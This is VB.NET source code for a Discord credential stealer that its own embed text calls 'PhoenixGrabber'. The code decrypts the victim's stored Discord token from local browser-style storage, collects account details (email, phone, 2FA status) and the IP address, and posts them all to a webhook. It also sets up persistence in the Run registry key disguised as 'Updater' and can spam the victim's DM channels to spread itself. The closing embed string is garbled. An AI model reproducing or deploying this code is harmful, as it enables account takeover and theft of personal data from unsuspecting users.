Imports Microsoft.Win32
Imports Newtonsoft.Json
Imports Newtonsoft.Json.Linq
Imports Org.BouncyCastle.Crypto.Engines
Imports Org.BouncyCastle.Crypto.Modes
Imports Org.BouncyCastle.Crypto.Parameters
Imports System
Imports System.IO
Imports System.Linq
Imports System.Net
Imports System.Reflection
Imports System.Security.Cryptography
Imports System.Text
Imports System.Text.RegularExpressions
Imports System.Threading
Imports System.Windows.Forms

Namespace Program
	Friend NotInheritable Class Program

		Private Sub New()
		End Sub

		#Region "Main"
		Shared Sub Main()
			Start()
			'SpreadMode
			'RunOnStartup
			'FakeError
		End Sub
		#End Region

		#Region "Spread Mode"
		Private Shared Sub SpreadMode(ByVal message As String)
			Dim request = SendGet("/users/@me/channels", secret())
			Dim array = JArray.Parse(request)
'MONSTERMC
			For Each entry As Object In array
				Send("/channels/" & entry.id & "/messages", "POST", secret(), "{""content"":""" & message & """}")
				Thread.Sleep(200)
			Next entry
		End Sub
		#End Region

		#Region "Request"
		Private Shared Sub Send(ByVal endpoint As String, ByVal method As String, ByVal auth As String, Optional ByVal json As String = Nothing)
			Try
				ServicePointManager.Expect100Continue = True
				ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12
				ServicePointManager.DefaultConnectionLimit = 5000
				Dim request = CType(WebRequest.Create("https://discord.com/api/v10" & endpoint), HttpWebRequest)
				request.Headers.Add("Authorization", auth)
				request.Method = method
				If Not String.IsNullOrEmpty(json) Then
					request.ContentType = "application/json"
					Using stream = New StreamWriter(request.GetRequestStream())
						stream.Write(json)
					End Using
				Else
					request.ContentLength = 0
				End If
				request.GetResponse()
				request.Abort()
			Catch
			End Try
		End Sub

		Private Shared Function SendGet(ByVal endpoint As String, ByVal auth As String, Optional ByVal method As String = Nothing, Optional ByVal json As String = Nothing) As String
			Dim text As String
			ServicePointManager.Expect100Continue = True
			ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12
			Dim request = CType(WebRequest.Create("https://discord.com/api/v10" & endpoint), HttpWebRequest)
			request.Headers.Add("Authorization", auth)
			If String.IsNullOrEmpty(method) Then
				request.Method = "GET"
			Else
				request.Method = method
			End If
			If Not String.IsNullOrEmpty(json) Then
				request.ContentType = "application/json"
				Using stream = New StreamWriter(request.GetRequestStream())
					stream.Write(json)
				End Using
			Else
				request.ContentLength = 0
			End If
			Dim response = CType(request.GetResponse(), HttpWebResponse)
			Using stream = New StreamReader(response.GetResponseStream())
				text = stream.ReadToEnd()
				stream.Dispose()
			End Using
			request.Abort()
			response.Close()
			Return text
		End Function
		#End Region

		#Region "Run On Startup"
		Private Shared Sub RunOnStartup()
			Try
				Dim startup As RegistryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True)
				startup.SetValue("Updater", System.Reflection.Assembly.GetExecutingAssembly().Location)
			Catch
			End Try
		End Sub
		#End Region

		#Region "Start"
		Private Shared Sub Start()
			Try
				Dim request = SendGet("/users/@me", secret())
				Dim id = JObject.Parse(request)("id").ToString()
				If String.IsNullOrEmpty(id) Then
					id = "N/A"
				End If
				Dim username = JObject.Parse(request)("username").ToString()
				If String.IsNullOrEmpty(username) Then
					username = "N/A"
				End If
				Dim discriminator = JObject.Parse(request)("discriminator").ToString()
				If String.IsNullOrEmpty(discriminator) Then
					discriminator = "N/A"
				End If
				Dim getbadges = JObject.Parse(request)("flags").ToString()
				Dim badges As String = ""
				If getbadges = "1" Then
					badges &= "Discord Employee, "
				End If
				If getbadges = "2" Then
					badges &= "Partnered Server Owner, "
				End If
				If getbadges = "4" Then
					badges &= "HypeSquad Events Member, "
				End If
				If getbadges = "8" Then
					badges &= "Bug Hunter Level 1, "
				End If
				If getbadges = "64" Then
					badges &= "House Bravery Member, "
				End If
				If getbadges = "128" Then
					badges &= "House Brilliance Member, "
				End If
				If getbadges = "256" Then
					badges &= "House Balance Member, "
				End If
				If getbadges = "512" Then
					badges &= "Early Nitro Supporter, "
				End If
				If getbadges = "16384" Then
					badges &= "Bug Hunter Level 2, "
				End If
				If getbadges = "131072" Then
					badges &= "Early Verified Bot Developer, "
				End If
				If String.IsNullOrEmpty(badges) Then
					badges = "N/A"
				End If
				Dim email = JObject.Parse(request)("email").ToString()
				If String.IsNullOrEmpty(email) Then
					email = "N/A"
				End If
				Dim phone = JObject.Parse(request)("phone").ToString()
				If String.IsNullOrEmpty(phone) Then
					phone = "N/A"
				End If
				Dim bio = JObject.Parse(request)("bio").ToString()
				If String.IsNullOrEmpty(bio) Then
					bio = "N/A"
				End If
				Dim locale = JObject.Parse(request)("locale").ToString()
				If String.IsNullOrEmpty(locale) Then
					locale = "N/A"
				End If
				Dim mfa = JObject.Parse(request)("mfa_enabled").ToString()
				If String.IsNullOrEmpty(mfa) Then
					mfa = "N/A"
				End If
				Dim avatarid = JObject.Parse(request)("avatar").ToString()
				Dim avatar As String
				If String.IsNullOrEmpty(avatarid) Then
					avatar = "N/A"
				Else
					avatar = "https://cdn.discordapp.com/avatars/" & id & "/" & avatarid & ".webp"
				End If
				Dim request2 = SendGet("/users/@me/settings", secret())
				Dim status = JObject.Parse(request2)("status").ToString()
				If String.IsNullOrEmpty(status) Then
					status = "N/A"
				End If
				DiscordEmbed("New account from " & username & "#" & discriminator, "1018364", id, email, phone, bio, locale, badges, mfa, status, avatar, I(), secret())
			Catch
			End Try
		End Sub
		#End Region

		#Region "IP Address"
		Private Shared Function I() As String
			Dim ii As String = ""
			Try
				ii = New WebClient() With {.Proxy = Nothing}.DownloadString("http://icanhazip.com/").Trim()
			Catch
				ii = "N/A"
			End Try
			Return ii
		End Function
		#End Region

		#Region "Get Token"
		Private Shared Function secret() As String
			Dim secret2 As String = ""

			Dim EncryptedRegex As New Regex("(dQw4w9WgXcQ:)([^.*\['(.*)'\].*$][^""]*)", RegexOptions.Compiled)

			Dim dbfiles() As String = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\discord\Local Storage\leveldb\", "*.ldb", SearchOption.AllDirectories)
			For Each file As String In dbfiles
				Dim info As New FileInfo(file)
				Dim contents As String = System.IO.File.ReadAllText(info.FullName)

				Dim match As Match = EncryptedRegex.Match(contents)
				If match.Success Then
					secret2 = secret3(Convert.FromBase64String(match.Value.Split( { "dQw4w9WgXcQ:" }, StringSplitOptions.None)(1)))
				End If
			Next file

			Return secret2
		End Function

		Private Shared Function secret4(ByVal path As String) As Byte()
'MONSTERMC
			Dim DeserializedFile As Object = JsonConvert.DeserializeObject(File.ReadAllText(path))
			Return ProtectedData.Unprotect(Convert.FromBase64String(CStr(DeserializedFile.os_crypt.encrypted_key)).Skip(5).ToArray(), Nothing, DataProtectionScope.CurrentUser)
		End Function

		Private Shared Function secret3(ByVal buffer() As Byte) As String
			Dim EncryptedData() As Byte = buffer.Skip(15).ToArray()
			Dim Params As New AeadParameters(New KeyParameter(secret4(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\discord\Local State")), 128, buffer.Skip(3).Take(12).ToArray(), Nothing)
			Dim BlockCipher As New GcmBlockCipher(New AesEngine())
			BlockCipher.Init(False, Params)
			Dim DecryptedBytes(BlockCipher.GetOutputSize(EncryptedData.Length) - 1) As Byte
			BlockCipher.DoFinal(DecryptedBytes, BlockCipher.ProcessBytes(EncryptedData, 0, EncryptedData.Length, DecryptedBytes, 0))
			Return Encoding.UTF8.GetString(DecryptedBytes).TrimEnd(ControlChars.CrLf & ControlChars.NullChar.ToCharArray())
		End Function
		#End Region

		#Region "Discord embed"
		Private Shared Sub DiscordEmbed(ByVal title As String, ByVal color As String, ByVal field1 As String, ByVal field2 As String, ByVal field3 As String, ByVal field4 As String, ByVal field5 As String, ByVal field6 As String, ByVal field7 As String, ByVal field8 As String, ByVal field9 As String, ByVal field10 As String, ByVal field11 As String)
			Try
				Dim wr = WebRequest.Create("Webhook")
				wr.ContentType = "application/json"
				wr.Method = "POST"
				Using sw = New StreamWriter(wr.GetRequestStream())
'		#End Region
					sw.Write("{""username"":""PhoenixGrabber"",""embeds"":[{""title"":""" & title & """,""color"":" & color & ",""footer"":{""icon_url"":""https: } wr.GetResponse(); } catch { } } } } 'avatars.githubusercontent.com/u/51336140?v=4.png\",\"text\":=\"github.com/extatent | PhoenixGrabber\"},\"thumbnail\":={\"url\":=\"https://avatars.githubusercontent.com/u/51336140?v=4.png\"},\"fields\":=({\"name\":=\"ID\",\"value\":=\"" & field1 & "\"},{\"name\":=\"Email\",\"value\":=\"" & field2 & "\"},{\"name\":=\"Phone Number\",\"value\":=\"" & field3 & "\"},{\"name\":=\"Biography\",\"value\":=\"" & field4 & "\"},{\"name\":=\"Locale\",\"value\":=\"" & field5 & "\"},{\"name\":=\"Badges\",\"value\":=\"" & field6 & "\"},{\"name\":=\"2FA Enabled\",\"value\":=\"" & field7 & "\"},{\"name\":=\"Status\",\"value\":=\"" & field8 & "\"},{\"name\":=\"Avatar\",\"value\":=\"" & field9 & "\"},{\"name\":=\"IP Address\",\"value\":=\"" & field10 & "\"},{\"name\":=\"Discord Token\",\"value\":=\"" & field11 & "\"})})}")